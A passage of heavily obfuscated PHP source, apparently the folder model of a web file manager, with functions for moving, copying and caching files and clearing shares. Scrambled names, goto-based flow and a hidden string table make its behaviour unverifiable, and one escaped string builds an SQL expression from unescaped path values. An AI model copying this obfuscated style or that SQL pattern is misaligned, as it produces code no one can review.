$EÆ¢·¬—Ê) { $F¯ßŠ­…ˆè =& $_SERVER[õëù©û]; $EÀŒº  = array(); $fÍ“è‘ªÆ = array(); foreach ($F¯îêÚã— as $bÓ¥ÏİéˆÈ) { $eÏ”Ë’š–ì = $bÓ¥ÏİéˆÈ[$F¯ßŠ­…ˆè[28]] . $F¯ßŠ­…ˆè[8] . $bÓ¥ÏİéˆÈ[$F¯ßŠ­…ˆè[454]]; $EÀŒº [$eÏ”Ë’š–ì] = $bÓ¥ÏİéˆÈ[$F¯ßŠ­…ˆè[365]]; } foreach ($EÆ¢·¬—Ê as $bÓ¥ÏİéˆÈ) { $eÏ”Ë’š–ì = $bÓ¥ÏİéˆÈ[$F¯ßŠ­…ˆè[28]] . $F¯ßŠ­…ˆè[8] . $bÓ¥ÏİéˆÈ[$F¯ßŠ­…ˆè[454]]; $Bà²Í—±´ = $EÀŒº [$eÏ”Ë’š–ì]; $fÍ“è‘ªÆ[$Bà²Í—±´] = $bÓ¥ÏİéˆÈ[$F¯ßŠ­…ˆè[365]]; } return $fÍ“è‘ªÆ; } private function _childrenMatch($D²ÔáŞ±Ëç, $bÂÙªĞÁ¥, $bšÌá³„¹ä) { goto E‹šÉ‚²›ß; bôÕŸê²å‡: foreach ($bñ¸ÃÃèí˜ as $D‚¤¿š¤çê) { if (isset($D²ÔáŞ±Ëç[$D‚¤¿š¤çê])) { $dİµ¬Ğ˜… .= $D²ÔáŞ±Ëç[$D‚¤¿š¤çê] . $d”×Åç¶Ã[512]; } } $dİµ¬Ğ˜… = rtrim($dİµ¬Ğ˜…, $d”×Åç¶Ã[47]) . $d”×Åç¶Ã[47]; $e½²‰Óğ¡Á = $this->parentLevelArray($dİµ¬Ğ˜…); goto D—á³îøğÊ; E‹šÉ‚²›ß: $d”×Åç¶Ã =& $_SERVER[õëù©û]; $dİµ¬Ğ˜… = $bšÌá³„¹ä[$d”×Åç¶Ã[454]]; $bñ¸ÃÃèí˜ = $this->parentLevelArray($bÂÙªĞÁ¥[$d”×Åç¶Ã[454]]); goto bôÕŸê²å‡; D—á³îøğÊ: $Bì¡¢ÉºÖÃ = $e½²‰Óğ¡Á[count($e½²‰Óğ¡Á) - 1]; return array($d”×Åç¶Ã[456] => $Bì¡¢ÉºÖÃ, $d”×Åç¶Ã[454] => $dİµ¬Ğ˜…); goto f¼¾‚ñß; f¼¾‚ñß: } private function _makeItemData($Aù£ˆŒ©†, $fÌƒ²¬ŒÄñ, $aÇ­¬“„÷) { $aôÌäÌğÁ =& $_SERVER[õëù©û]; $d¨Š™ñ×‚œ = array($aôÌäÌğÁ[513] => $Aù£ˆŒ©†[$aôÌäÌğÁ[366]], $aôÌäÌğÁ[382] => $aÇ­¬“„÷, $aôÌäÌğÁ[514] => $Aù£ˆŒ©†[$aôÌäÌğÁ[368]], $aôÌäÌğÁ[415] => $Aù£ˆŒ©†[$aôÌäÌğÁ[414]], $aôÌäÌğÁ[515] => $Aù£ˆŒ©†[$aôÌäÌğÁ[77]], $aôÌäÌğÁ[516] => $fÌƒ²¬ŒÄñ[$aôÌäÌğÁ[367]], $aôÌäÌğÁ[517] => $fÌƒ²¬ŒÄñ[$aôÌäÌğÁ[451]], $aôÌäÌğÁ[518] => USER_ID, $aôÌäÌğÁ[519] => USER_ID, $aôÌäÌğÁ[364] => $fÌƒ²¬ŒÄñ[$aôÌäÌğÁ[365]], $aôÌäÌğÁ[520] => $fÌƒ²¬ŒÄñ[$aôÌäÌğÁ[454]] . $fÌƒ²¬ŒÄñ[$aôÌäÌğÁ[365]] . $aôÌäÌğÁ[47], $aôÌäÌğÁ[391] => 0, $aôÌäÌğÁ[521] => $aôÌäÌğÁ[33]); return $d¨Š™ñ×‚œ; } private function _copyApplyMeta($aËˆ©¢È , &$aø‹ˆÖÃÂø) { $cƒÒ‘–µ¤‡ =& $_SERVER[õëù©û]; $F¶÷ñÅ©ªì = $aËˆ©¢È [$cƒÒ‘–µ¤‡[365]]; $bµæ£ÊˆÜŒ = $aËˆ©¢È [$cƒÒ‘–µ¤‡[28]]; if (!isset($aËˆ©¢È [$cƒÒ‘–µ¤‡[522]]) || !$aËˆ©¢È [$cƒÒ‘–µ¤‡[522]] || $aËˆ©¢È [$cƒÒ‘–µ¤‡[522]] == $cƒÒ‘–µ¤‡[463]) { $aø‹ˆÖÃÂø[$cƒÒ‘–µ¤‡[498]][] = array($cƒÒ‘–µ¤‡[365], $F¶÷ñÅ©ªì, $cƒÒ‘–µ¤‡[522], short_id($F¶÷ñÅ©ªì)); } if (Input::check($bµæ£ÊˆÜŒ, $cƒÒ‘–µ¤‡[523])) { $aø‹ˆÖÃÂø[$cƒÒ‘–µ¤‡[497]][] = array($cƒÒ‘–µ¤‡[365] => $F¶÷ñÅ©ªì, $cƒÒ‘–µ¤‡[89] => $cƒÒ‘–µ¤‡[411], $cƒÒ‘–µ¤‡[355] => str_replace($cƒÒ‘–µ¤‡[50], $cƒÒ‘–µ¤‡[33], Pinyin::encode($bµæ£ÊˆÜŒ))); $aø‹ˆÖÃÂø[$cƒÒ‘–µ¤‡[497]][] = array($cƒÒ‘–µ¤‡[365] => $F¶÷ñÅ©ªì, $cƒÒ‘–µ¤‡[89] => $cƒÒ‘–µ¤‡[410], $cƒÒ‘–µ¤‡[355] => Pinyin::encode($bµæ£ÊˆÜŒ, $cƒÒ‘–µ¤‡[524])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($fÒŠÊ™µ¸) { goto BÌ©ŸèÁĞ‰; Bïæİ‚¿Ê: $FŞÚ›Ê° = array($BŸİİ¨¼“Š[454] => array($BŸİİ¨¼“Š[478], $Dİ‹ëïÚ¢[$BŸİİ¨¼“Š[454]] . $fÒŠÊ™µ¸ . $BŸİİ¨¼“Š[479]), $BŸİİ¨¼“Š[392] => $this->targetIsDelete); $Eˆô‰¨…ŞÈ = $this->field($FõàÙ„§êÁ)->where($FŞÚ›Ê°)->select(); if (!$Eˆô‰¨…ŞÈ) { return; } goto dš¡éÄœóÕ; BÌ©ŸèÁĞ‰: $BŸİİ¨¼“Š =& $_SERVER[õëù©û]; $Dİ‹ëïÚ¢ = $this->sourceInfo($fÒŠÊ™µ¸); $FõàÙ„§êÁ = $BŸİİ¨¼“Š[525]; goto Bïæİ‚¿Ê; dš¡éÄœóÕ: $Eˆô‰¨…ŞÈ = array_to_keyvalue($Eˆô‰¨…ŞÈ, $BŸİİ¨¼“Š[365]); foreach ($Eˆô‰¨…ŞÈ as $Cîâä âßÎ) { $DÍÄ¿°×õì = $Cîâä âßÎ[$BŸİİ¨¼“Š[456]]; $fÒŠÊ™µ¸ = $Cîâä âßÎ[$BŸİİ¨¼“Š[365]]; if (!isset($this->_childrenListCache[$fÒŠÊ™µ¸]) && $Cîâä âßÎ[$BŸİİ¨¼“Š[366]] == $BŸİİ¨¼“Š[83]) { $this->_childrenListCache[$fÒŠÊ™µ¸] = array(); } if (!isset($this->_childrenListCache[$DÍÄ¿°×õì])) { $this->_childrenListCache[$DÍÄ¿°×õì] = array(); } $this->_childrenListCache[$DÍÄ¿°×õì][$fÒŠÊ™µ¸] = $Cîâä âßÎ; $this->_childrenItemCache[$fÒŠÊ™µ¸] = $Cîâä âßÎ; } goto DÙ‚®øĞÊ; DÙ‚®øĞÊ: } private function _childrenListAll($F¦¼ñÏ‚, &$cˆğŸÃÚƒÙ) { $BÕÃíÚİ¨‹ =& $_SERVER[õëù©û]; if (!isset($this->_childrenListCache[$F¦¼ñÏ‚])) { return; } $bø‰Íå»Ğ„ = $this->_childrenListCache[$F¦¼ñÏ‚]; foreach ($bø‰Íå»Ğ„ as $DŠ‘Êƒ‘¥Ç => $bô­Î·¬ÍÃ) { $cˆğŸÃÚƒÙ[$DŠ‘Êƒ‘¥Ç] = $bô­Î·¬ÍÃ; if ($bô­Î·¬ÍÃ[$BÕÃíÚİ¨‹[366]] == $BÕÃíÚİ¨‹[83]) { $this->_childrenListAll($DŠ‘Êƒ‘¥Ç, $cˆğŸÃÚƒÙ); } } } private function sourceInfoCache($D­£ˆÖ ƒÀ) { if (isset($this->_childrenItemCache[$D­£ˆÖ ƒÀ])) { return $this->_childrenItemCache[$D­£ˆÖ ƒÀ]; } return $this->sourceInfo($D­£ˆÖ ƒÀ); } private function _childrenList($c†ßöóš¨Š) { if (isset($this->_childrenListCache[$c†ßöóš¨Š])) { return $this->_childrenListCache[$c†ßöóš¨Š]; } return $this->_childrenListSelect($c†ßöóš¨Š); } private function _childrenListSelect($FÖñ­ˆÄÉ˜) { goto bƒ–Û‘Äƒ›; bƒ–Û‘Äƒ›: $d¢À³Ó¶âÎ =& $_SERVER[õëù©û]; $díøƒ•Í’“ = array($d¢À³Ó¶âÎ[456] => $FÖñ­ˆÄÉ˜, $d¢À³Ó¶âÎ[392] => $this->targetIsDelete); $B¹³“ï£ƒ = $this->where($díøƒ•Í’“)->select(); goto Dê½ÆÖœ¹; d–Â¦£ù: foreach ($a†Œ²‰½Ï as $FÖñ­ˆÄÉ˜ => $fÉ´ Ïïö) { $this->_childrenItemCache[$FÖñ­ˆÄÉ˜] = $fÉ´ Ïïö; } return $a†Œ²‰½Ï; goto A÷¼–İõ¥; Dê½ÆÖœ¹: $B¹³“ï£ƒ = $B¹³“ï£ƒ ? $B¹³“ï£ƒ : array(); $a†Œ²‰½Ï = array_to_keyvalue($B¹³“ï£ƒ, $d¢À³Ó¶âÎ[365]); $this->_childrenListCache[$FÖñ­ˆÄÉ˜] = $a†Œ²‰½Ï; goto d–Â¦£ù; A÷¼–İõ¥: } private function fileNameExistCache($cŠ¼æö×Ï, $B’ÛÎˆë—ô) { $BÂ©ÉÓ…÷ =& $_SERVER[õëù©û]; $B’ÛÎˆë—ô = strtolower($B’ÛÎˆë—ô); $E¤ğôÚÅÀ = $this->_childrenList($cŠ¼æö×Ï); foreach ($E¤ğôÚÅÀ as $b§Üö†ò¨Ó) { if ($B’ÛÎˆë—ô == strtolower($b§Üö†ò¨Ó[$BÂ©ÉÓ…÷[28]])) { return $b§Üö†ò¨Ó[$BÂ©ÉÓ…÷[365]]; } } return !1; } private function fileNameAutoCache($F’õ‚‹Ó÷ø, $Aµ¤Õ²‚îÃ, $bòç®”°, $e¢È›åãÄí) { $c¸‹ãß™Öô =& $_SERVER[õëù©û]; $CÚùË«Éâê = $this->_childrenList($F’õ‚‹Ó÷ø); $fÉâ›¿Öƒ¸ = array_to_keyvalue($CÚùË«Éâê, $c¸‹ãß™Öô[33], $c¸‹ãß™Öô[28]); return $this->fileNameAutoGet($fÉâ›¿Öƒ¸, $Aµ¤Õ²‚îÃ, $bòç®”°, $e¢È›åãÄí); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($F× óìÊ¦Ú, $CÍË˜†¥¿ö, $d×»Óí¡’¡ = REPEAT_REPLACE, $eÈê¹Õ¥’Æ = '') { goto cÌ†¤î§’Ö; Cà×¯¬ÖìÌ: $E‰ÒæˆÔä§ = array($Fè×òŠªàÕ[$b¡Ï·É³¥[456]], $CÍË˜†¥¿ö); if ($Fè×òŠªàÕ[$b¡Ï·É³¥[366]] == $b¡Ï·É³¥[83]) { $E‰ÒæˆÔä§[] = $F× óìÊ¦Ú; } $this->updateModifyTime($E‰ÒæˆÔä§); goto Aì°ÈïÂ; cÌ†¤î§’Ö: $b¡Ï·É³¥ =& $_SERVER[õëù©û]; $Fè×òŠªàÕ = $this->sourceInfo($F× óìÊ¦Ú); $b¬ã”É½×´ = $this->sourceInfo($CÍË˜†¥¿ö); goto A¦òï¾ß²; Aì°ÈïÂ: Model($b¡Ï·É³¥[500])->eventMove($F× óìÊ¦Ú, $Fè×òŠªàÕ[$b¡Ï·É³¥[456]], $CÍË˜†¥¿ö); Hook::trigger($b¡Ï·É³¥[527], $c›Ä—â·â¤); return $c”´öñé‰Ô; goto CÃáÅÉàÎŠ; DµŞ¨·ƒÎ•: $this->lockWriteEnd($CÍË˜†¥¿ö, $eÅºáÈùÙ‡); $this->folderSizeReset($Fè×òŠªàÕ[$b¡Ï·É³¥[456]]); $this->folderSizeReset($CÍË˜†¥¿ö); goto Cà×¯¬ÖìÌ; cˆ™ÃƒŸä‰: $BÒˆ‡”‰² = array($b¡Ï·É³¥[496] => array(), $b¡Ï·É³¥[528] => !1); $this->clearShare($F× óìÊ¦Ú, $CÍË˜†¥¿ö); $fÑ«ã—çØ = $this->fileNameExistCache($CÍË˜†¥¿ö, $Fè×òŠªàÕ[$b¡Ï·É³¥[28]]); goto dÌïÊº—…§; E™¿Î¼¼ò™: $eÅºáÈùÙ‡ = $eÈê¹Õ¥’Æ ? $eÈê¹Õ¥’Æ : $Fè×òŠªàÕ[$b¡Ï·É³¥[28]]; $this->lockMoveStart($F× óìÊ¦Ú); $this->lockWriteStart($CÍË˜†¥¿ö, $eÅºáÈùÙ‡); goto cˆ™ÃƒŸä‰; Aöä©§¾ºƒ: Model($b¡Ï·É³¥[163])->linkAdd($BÒˆ‡”‰²[$b¡Ï·É³¥[496]]); if ($fÑ«ã—çØ && $BÒˆ‡”‰²[$b¡Ï·É³¥[528]]) { $this->removeNow($F× óìÊ¦Ú, !1); } $this->lockMoveEnd($F× óìÊ¦Ú); goto DµŞ¨·ƒÎ•; A¦òï¾ß²: $c›Ä—â·â¤ = $this->pathInfoMore($F× óìÊ¦Ú); if ($this->isParentOf($F× óìÊ¦Ú, $CÍË˜†¥¿ö)) { return !1; } if (!$Fè×òŠªàÕ || !$b¬ã”É½×´ || $b¬ã”É½×´[$b¡Ï·É³¥[366]] != $b¡Ï·É³¥[83]) { return !1; } goto b“Ğİ¨’âÎ; b“Ğİ¨’âÎ: Hook::trigger($b¡Ï·É³¥[526], $c›Ä—â·â¤); $this->targetIsDelete = intval($Fè×òŠªàÕ[$b¡Ï·É³¥[392]]); if ($Fè×òŠªàÕ[$b¡Ï·É³¥[456]] == $CÍË˜†¥¿ö && $eÈê¹Õ¥’Æ != $Fè×òŠªàÕ[$b¡Ï·É³¥[28]]) { $a‡®ÓÎ·¾ç = $this->fileNameExist($CÍË˜†¥¿ö, $eÈê¹Õ¥’Æ); if ($a‡®ÓÎ·¾ç && $Fè×òŠªàÕ[$b¡Ï·É³¥[366]] == $b¡Ï·É³¥[463]) { goto Cõš®±³ó; a‚õÑ„šæ: return $a‡®ÓÎ·¾ç; goto Dˆƒ¡ÃÍîç; CÒ†²³Ö…¡: $this->removeNow($F× óìÊ¦Ú, !1); $this->folderSizeReset($CÍË˜†¥¿ö); Hook::trigger($b¡Ï·É³¥[527], $c›Ä—â·â¤); goto a‚õÑ„šæ; Cõš®±³ó: $b†ÃÛ»ÛÅé = $this->sourceInfo($a‡®ÓÎ·¾ç); $e×‘òĞã— = $this->fileHistory($b†ÃÛ»ÛÅé, $Fè×òŠªàÕ[$b¡Ï·É³¥[414]], $Fè×òŠªàÕ[$b¡Ï·É³¥[77]]); if (!$e×‘òĞã—) { Model($b¡Ï·É³¥[417])->remove($Fè×òŠªàÕ[$b¡Ï·É³¥[414]]); } goto CÒ†²³Ö…¡; Dˆƒ¡ÃÍîç: } } goto E™¿Î¼¼ò™; dÌïÊº—…§: $c”´öñé‰Ô = $this->_move($F× óìÊ¦Ú, $CÍË˜†¥¿ö, $d×»Óí¡’¡, $BÒˆ‡”‰², $eÈê¹Õ¥’Æ); $this->sourceCacheClear(); if ($Fè×òŠªàÕ[$b¡Ï·É³¥[366]] == $b¡Ï·É³¥[83] && $fÑ«ã—çØ) { $this->folderSizeResetChildren($c”´öñé‰Ô); } goto Aöä©§¾ºƒ; CÃáÅÉàÎŠ: } private function _move($fÉ´‘µïï¶, $eÒÛæî·äø, $bÃ¹ëÖˆ, &$CÁ¬÷íÓ¨, $b¿– Ï¡Ó = '') { goto c‚šÈŞ”òİ; f¯—½ˆå­Å: return $eª—£àÃ; goto DíÂâ£‘Ÿî; FÔÚ­õ’¶: $EùµìŸíã = $b¿– Ï¡Ó ? $b¿– Ï¡Ó : $DÚ¸ƒ¢¹Ôà[$DéíÒ†×µ…[28]]; $CŸ©õ°“–Ë = $this->fileNameExistCache($eÒÛæî·äø, $EùµìŸíã); $this->lockMoveStart($fÉ´‘µïï¶); goto F­—É’ÃÆ; F­—É’ÃÆ: $this->lockWriteStart($eÒÛæî·äø, $EùµìŸíã); if (!$CŸ©õ°“–Ë) { return $this->_moveForce($fÉ´‘µïï¶, $eÒÛæî·äø, $EùµìŸíã); } $eª—£àÃ = $CŸ©õ°“–Ë; goto FˆÀÓêø±‚; c‚šÈŞ”òİ: $DéíÒ†×µ… =& $_SERVER[õëù©û]; $DÚ¸ƒ¢¹Ôà = $this->sourceInfo($fÉ´‘µïï¶); $aÆˆØ ÜÂà = $DÚ¸ƒ¢¹Ôà[$DéíÒ†×µ…[366]] == $DéíÒ†×µ…[83]; goto FÔÚ­õ’¶; FˆÀÓêø±‚: $a­¢Ç¼Ù·ä = !1; if ($aÆˆØ ÜÂà) { if ($bÃ¹ëÖˆ == REPEAT_RENAME_FOLDER) { $EùµìŸíã = $this->fileNameAuto($eÒÛæî·äø, $EùµìŸíã, $bÃ¹ëÖˆ, $aÆˆØ ÜÂà); $eª—£àÃ = $this->_moveForce($fÉ´‘µïï¶, $eÒÛæî·äø, $EùµìŸíã); } else { if ($bÃ¹ëÖˆ == REPEAT_RENAME_FOLDER) { $bÃ¹ëÖˆ = REPEAT_RENAME; } $FåŠŠ‰Ş = $this->_childrenListSelect($fÉ´‘µïï¶); foreach ($FåŠŠ‰Ş as $b›¹£²•™ê) { $this->_move($b›¹£²•™ê[$DéíÒ†×µ…[365]], $CŸ©õ°“–Ë, $bÃ¹ëÖˆ, $CÁ¬÷íÓ¨); } $a­¢Ç¼Ù·ä = !0; } } else { if ($bÃ¹ëÖˆ == REPEAT_SKIP) { $a­¢Ç¼Ù·ä = !0; } else { if ($bÃ¹ëÖˆ == REPEAT_RENAME || $bÃ¹ëÖˆ == REPEAT_RENAME_FOLDER) { $EùµìŸíã = $this->fileNameAuto($eÒÛæî·äø, $EùµìŸíã, $bÃ¹ëÖˆ, $aÆˆØ ÜÂà); $eª—£àÃ = $this->_moveForce($fÉ´‘µïï¶, $eÒÛæî·äø, $EùµìŸíã); } else { if ($bÃ¹ëÖˆ == REPEAT_REPLACE) { $BÃ¸øäÄæì = $this->sourceInfoCache($CŸ©õ°“–Ë); $cäÃè…¤íÏ = $this->fileHistory($BÃ¸øäÄæì, $DÚ¸ƒ¢¹Ôà[$DéíÒ†×µ…[414]], $DÚ¸ƒ¢¹Ôà[$DéíÒ†×µ…[77]]); if ($cäÃè…¤íÏ) { $CÁ¬÷íÓ¨[$DéíÒ†×µ…[496]][] = $DÚ¸ƒ¢¹Ôà[$DéíÒ†×µ…[414]]; } else { $a­¢Ç¼Ù·ä = !0; } } } } } if ($a­¢Ç¼Ù·ä && !$CÁ¬÷íÓ¨[$DéíÒ†×µ…[528]]) { $CÁ¬÷íÓ¨[$DéíÒ†×µ…[528]] = !0; } goto f¯—½ˆå­Å; DíÂâ£‘Ÿî: } private function _moveForce($cÉŞÑ³°”Ó, $cÚâ´¶“, $d·¬¹£ôà®) { goto bÃŸ‘â®‚; bÃŸ‘â®‚: $A°«ê¿ğ« =& $_SERVER[õëù©û]; $Bë…ï‰·‡ = $this->sourceInfo($cÉŞÑ³°”Ó); $eƒôå¶°°ô = $this->sourceInfo($cÚâ´¶“); goto e²îµÎ§Û; A³©ŒÏºÍ: if (!$d¿ˆœàİÓŒ) { Model($A°«ê¿ğ«[449])->authClear($cÉŞÑ³°”Ó); } $c¿„…ëÆªÆ = $Bë…ï‰·‡[$A°«ê¿ğ«[392]] == $A°«ê¿ğ«[83] && $eƒôå¶°°ô[$A°«ê¿ğ«[392]] != $A°«ê¿ğ«[83]; if ($c¿„…ëÆªÆ) { $F¹¹î…Èõ»[$A°«ê¿ğ«[391]] = 0; } goto BÒÄô„ŒîŸ; BÒÄô„ŒîŸ: if ($F‘À¯À½ß¨) { $a×ŸŠÄê¶ = array($A°«ê¿ğ«[520] => array($A°«ê¿ğ«[478], $Bë…ï‰·‡[$A°«ê¿ğ«[454]] . $Bë…ï‰·‡[$A°«ê¿ğ«[365]] . $A°«ê¿ğ«[479])); $d•Øí­£·· = $Bë…ï‰·‡[$A°«ê¿ğ«[454]] . $Bë…ï‰·‡[$A°«ê¿ğ«[365]] . $A°«ê¿ğ«[47]; $CëÎÚêÛóÈ = $eƒôå¶°°ô[$A°«ê¿ğ«[454]] . $eƒôå¶°°ô[$A°«ê¿ğ«[365]] . $A°«ê¿ğ«[47] . $Bë…ï‰·‡[$A°«ê¿ğ«[365]] . $A°«ê¿ğ«[47]; $BÀ·ŸÉ›ù® = array($A°«ê¿ğ«[520] => array($A°«ê¿ğ«[529], "\162\145\160\x6c\141\x63\145\x28\x70\141\162\145\x6e\x74\114\x65\166\145\x6c\x2c\47{$d•Øí­£··}\47\54\47{$CëÎÚêÛóÈ}\x27\x29"), $A°«ê¿ğ«[516] => $eƒôå¶°°ô[$A°«ê¿ğ«[367]], $A°«ê¿ğ«[517] => $eƒôå¶°°ô[$A°«ê¿ğ«[451]]); if ($c¿„…ëÆªÆ) { $BÀ·ŸÉ›ù®[$A°«ê¿ğ«[391]] = 0; } $this->where($a×ŸŠÄê¶)->data($BÀ·ŸÉ›ù®)->save(); } $this->where(array($A°«ê¿ğ«[379] => $cÉŞÑ³°”Ó))->data($F¹¹î…Èõ»)->save(); return $cÉŞÑ³°”Ó; goto aÅøª…‰¦; e²îµÎ§Û: $F‘À¯À½ß¨ = $Bë…ï‰·‡[$A°«ê¿ğ«[366]] == $A°«ê¿ğ«[83]; $F¹¹î…Èõ» = array($A°«ê¿ğ«[364] => $eƒôå¶°°ô[$A°«ê¿ğ«[365]], $A°«ê¿ğ«[520] => $eƒôå¶°°ô[$A°«ê¿ğ«[454]] . $eƒôå¶°°ô[$A°«ê¿ğ«[365]] . $A°«ê¿ğ«[47], $A°«ê¿ğ«[516] => $eƒôå¶°°ô[$A°«ê¿ğ«[367]], $A°«ê¿ğ«[517] => $eƒôå¶°°ô[$A°«ê¿ğ«[451]], $A°«ê¿ğ«[519] => USER_ID, $A°«ê¿ğ«[382] => $d·¬¹£ôà®); $d¿ˆœàİÓŒ = $Bë…ï‰·‡[$A°«ê¿ğ«[367]] == SourceModel::TYPE_GROUP && $eƒôå¶°°ô[$A°«ê¿ğ«[367]] == SourceModel::TYPE_GROUP && $Bë…ï‰·‡[$A°«ê¿ğ«[451]] == $eƒôå¶°°ô[$A°«ê¿ğ«[451]]; goto A³©ŒÏºÍ; aÅøª…‰¦: } private function clearShare($BÀÜä«ÁÌé, $FÄ³ï›¶º•) { goto E´î²­‚«ˆ; e˜òµ£Æ: if (!$a­‘Ã¯ªÑÎ) { return; } $a­‘Ã¯ªÑÎ = array_to_keyvalue($a­‘Ã¯ªÑÎ, $eÄé­œÀ†Î[33], $eÄé­œÀ†Î[436]); $b‰ÊğµğĞÎ = array($eÄé­œÀ†Î[436] => array($eÄé­œÀ†Î[7], $a­‘Ã¯ªÑÎ)); goto EÓŸÂíƒÓŒ; E´î²­‚«ˆ: $eÄé­œÀ†Î =& $_SERVER[õëù©û]; $bãã÷ŒÆÙ™ = $this->sourceInfo($BÀÜä«ÁÌé); $cóÔ›Ÿ‘¡¡ = $this->sourceInfo($FÄ³ï›¶º•); goto BªÌßŸÍ™“; b‰àùŒŸ×: if (!$EÀÔÓÙŠÈÏ) { return; } $b‰ÊğµğĞÎ = array($eÄé­œÀ†Î[365] => array($eÄé­œÀ†Î[7], $EÀÔÓÙŠÈÏ), $eÄé­œÀ†Î[443] => 1); $a­‘Ã¯ªÑÎ = Model($eÄé­œÀ†Î[531])->field($eÄé­œÀ†Î[436])->where($b‰ÊğµğĞÎ)->select(); goto e˜òµ£Æ; EÓŸÂíƒÓŒ: Model($eÄé­œÀ†Î[531])->where($b‰ÊğµğĞÎ)->save(array($eÄé­œÀ†Î[443] => 0)); Model($eÄé­œÀ†Î[532])->where($b‰ÊğµğĞÎ)->delete(); goto bÌå•×ëÊÖ; BªÌßŸÍ™“: if ($bãã÷ŒÆÙ™[$eÄé­œÀ†Î[451]] == $cóÔ›Ÿ‘¡¡[$eÄé­œÀ†Î[451]] && $bãã÷ŒÆÙ™[$eÄé­œÀ†Î[367]] == $eÄé­œÀ†Î[530]) { return; } $b‰ÊğµğĞÎ = array($eÄé­œÀ†Î[454] => array($eÄé­œÀ†Î[478], $bãã÷ŒÆÙ™[$eÄé­œÀ†Î[454]] . $BÀÜä«ÁÌé . $eÄé­œÀ†Î[479])); $EÀÔÓÙŠÈÏ = $this->field($eÄé­œÀ†Î[379])->where($b‰ÊğµğĞÎ)->getField($eÄé­œÀ†Î[365], !0); goto b‰àùŒŸ×; bÌå•×ëÊÖ: } public function copyFolderFromIO($BŒç¬ï‚, $FÇ¿ƒ¯›Œ°, $eÆñ•ãàÂ, $AĞ•Û¾¤Ñ, $d¸…¾Š¿äñ, $cíÇÑŸ±ğš = false) { goto dÚÍ‘Êª¨; dÚÍ‘Êª¨: $D“£‰•êÀÜ =& $_SERVER[õëù©û]; $bïø«º¥²‹ = array($D“£‰•êÀÜ[497] => array(), $D“£‰•êÀÜ[498] => array(), $D“£‰•êÀÜ[496] => array(), $D“£‰•êÀÜ[533] => array()); $dò¡ò¾— = $cíÇÑŸ±ğš ? $cíÇÑŸ±ğš : $BŒç¬ï‚->getPathName($BŒç¬ï‚->pathThis($FÇ¿ƒ¯›Œ°)); goto E‹¥È˜§ŠÇ; a¥Š¹‡»Âç: Model($D“£‰•êÀÜ[499])->addAll($bïø«º¥²‹[$D“£‰•êÀÜ[497]], array(), !0); Model($D“£‰•êÀÜ[500])->eventCopy($Fá”‘„É„¦); $this->saveAll($bïø«º¥²‹[$D“£‰•êÀÜ[498]]); goto c¼¦¿„¬ÅÎ; c¼¦¿„¬ÅÎ: Model($D“£‰•êÀÜ[417])->linkAdd($bïø«º¥²‹[$D“£‰•êÀÜ[496]]); Model($D“£‰•êÀÜ[417])->remove($bïø«º¥²‹[$D“£‰•êÀÜ[533]]); $this->folderSizeReset($eÆñ•ãàÂ); goto eå˜®æÔÁô; eå˜®æÔÁô: $this->updateModifyTime($eÆñ•ãàÂ); return $Fá”‘„É„¦; goto F¼î—‹‹Ü; cÛáŠãğ´ƒ: if ($b‰¶İ‚¢) { $this->_childrenAllMake($b‰¶İ‚¢); } Hook::trigger($D“£‰•êÀÜ[534]); $this->_copyChildTo($BŒç¬ï‚, $FÇ¿ƒ¯›Œ°, $Fá”‘„É„¦, $AĞ•Û¾¤Ñ, $bïø«º¥²‹, $d¸…¾Š¿äñ); goto CÒë´æšÛö; E‹¥È˜§ŠÇ: $b‰¶İ‚¢ = $this->fileNameExist($eÆñ•ãàÂ, $dò¡ò¾—); $Fá”‘„É„¦ = $this->mkdir($eÆñ•ãàÂ, $dò¡ò¾—, $AĞ•Û¾¤Ñ); if (!$b‰¶İ‚¢ || $AĞ•Û¾¤Ñ == REPEAT_RENAME_FOLDER) { $AĞ•Û¾¤Ñ = !1; } goto cÛáŠãğ´ƒ; CÒë´æšÛö: Hook::trigger($D“£‰•êÀÜ[535]); if ($Fá”‘„É„¦) { $this->folderSizeResetChildren($Fá”‘„É„¦); } $this->_childrenListClear(); goto a¥Š¹‡»Âç; F¼î—‹‹Ü: } private function _copyChildTo($FÇÎ’Áîí, $a¶Å°Üî¼‰, $BïßæÊºŠ¹, $C§âÉíˆÓŒ, &$Aóº›ˆ¬ÇÌ, $Fƒó›ó—) { goto a•²è İë‘; a•²è İë‘: $E˜¦ùÁŸñÎ =& $_SERVER[õëù©û]; $BÚ¶ã‡È  = $this->sourceInfoCache($BïßæÊºŠ¹); $cÓêÉìİ” = $FÇÎ’Áîí->listPath($a¶Å°Üî¼‰, !1, !0); goto DòÅÁì˜; DòÅÁì˜: $E†ªŞ¢­— = array_merge($cÓêÉìİ”[$E˜¦ùÁŸñÎ[73]], $cÓêÉìİ”[$E˜¦ùÁŸñÎ[74]]); $aÌ±´è ¹• = $this->_addFiles($FÇÎ’Áîí, $cÓêÉìİ”[$E˜¦ùÁŸñÎ[73]], $Fƒó›ó—); $BŞñö¾«›Ú = array(); goto e¼È÷¸‰õ–; e¼È÷¸‰õ–: foreach ($E†ªŞ¢­— as &$cí®ÄÈÎŸ) { goto Dëİø¨Ç©“; b‡±ÅÅ«îï: if ($C§âÉíˆÓŒ) { $fÑ Ù“ñîƒ = $this->fileNameExistCache($BïßæÊºŠ¹, $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[28]]); if ($fÑ Ù“ñîƒ) { if ($cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[366]] || $C§âÉíˆÓŒ == REPEAT_SKIP) { continue; } if ($C§âÉíˆÓŒ == REPEAT_REPLACE) { $fƒ’‹¶Øâ¶ = $this->sourceInfoCache($fÑ Ù“ñîƒ); $aïÊ›ê”§ = $this->fileHistory($fƒ’‹¶Øâ¶, $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[414]], $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[77]]); if ($aïÊ›ê”§) { $Aóº›ˆ¬ÇÌ[$E˜¦ùÁŸñÎ[496]][] = $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[414]]; } continue; } else { if ($C§âÉíˆÓŒ == REPEAT_RENAME) { $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[28]] = $this->fileNameAutoCache($BïßæÊºŠ¹, $cí®ÄÈÎŸ[$E˜¦ùÁŸñÎ[28]], $C§âÉíˆÓŒ, !1); } } } } if 